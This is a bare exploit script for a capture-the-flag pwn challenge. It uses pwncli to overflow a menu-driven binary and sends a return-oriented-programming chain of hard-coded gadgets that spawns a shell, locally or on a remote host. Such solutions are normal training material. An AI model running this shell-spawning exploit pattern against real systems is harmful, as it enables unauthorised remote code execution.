#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

syscall = 0x00000000004011a2
pop_rdi_ret = 0x0000000000401f3d
pop_rsi_ret = 0x000000000040ab23
pop_rdx_rbx_ret = 0x0000000000463367
sh_addr = 0x48e7cc

payload = flat([
    pop_rdi_ret, sh_addr, pop_rsi_ret, 0, pop_rdx_rbx_ret, 0, 0, syscall
])

sl(b"1")
s(b"a"*0x10 + p8(0x20))
sl(b"2")
sl( p64(0xdeadbeef) + payload )
sl(b"3")


ia()
